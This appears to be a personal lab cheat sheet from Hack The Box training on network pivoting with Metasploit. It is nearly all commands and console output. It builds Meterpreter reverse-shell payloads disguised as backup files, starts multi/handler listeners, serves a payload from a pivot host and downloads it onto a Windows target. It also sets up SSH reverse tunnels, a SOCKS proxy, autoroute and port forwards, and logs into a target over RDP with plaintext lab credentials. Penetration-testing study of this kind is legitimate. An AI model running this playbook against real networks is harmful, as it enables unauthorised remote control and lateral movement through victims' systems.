
#### Creating a Windows Payload with msfvenom (revshell windows)

```shell-session
Tachipy@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```
#### Creating Payload for Ubuntu Pivot Host (revshells linux)

```shell-session
Tachipy@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.253 -f elf -o backupjob LPORT=8080
```
#### Configuring & Starting the multi/handler
```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000

```
#### Transferring Payload to Pivot Host

```shell-session
Tachipy@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```
#### Starting Python3 Webserver on Pivot Host

chm```shell-session
ubuntu@Webserver$ python3 -m http.server 8123
```

#### Downloading Payload from Windows Target

```powershell-session
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```
#### Using SSH -R

```shell-session
Tachipy@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN
```
#### Ping Sweep

```shell-session
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```


## MSFConsole SOCKS Forwarding
#### Configuring MSF's SOCKS Proxy (instead of ssh Port Fowarding - works only post exploit)

```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options
```
#### Confirming Proxy Server is Running

```shell-session
msf6 auxiliary(server/socks_proxy) > jobs
```
#### Adding a Line to proxychains.conf if Needed

```shell-session
socks4 	127.0.0.1 9050
```
#### Creating Routes with AutoRoute

```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```

OR
  
Creating Routes with AutoRoute

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23
```

#### Listing Active Routes with AutoRoute

```shell-session
meterpreter > run autoroute -p
```

#### Testing Proxy & Routing Functionality


```shell-session
Tachipy@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

## MSFConsole Port Forwarding (post exploit)
#### Creating Local TCP Relay
```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
#### Connecting to Windows Target through localhost
```shell-session
Tachipy@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```
## MSFConsole Reverse Port Forwarding Rules

```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```
#### Configuring & Starting multi/handler
```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```
```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```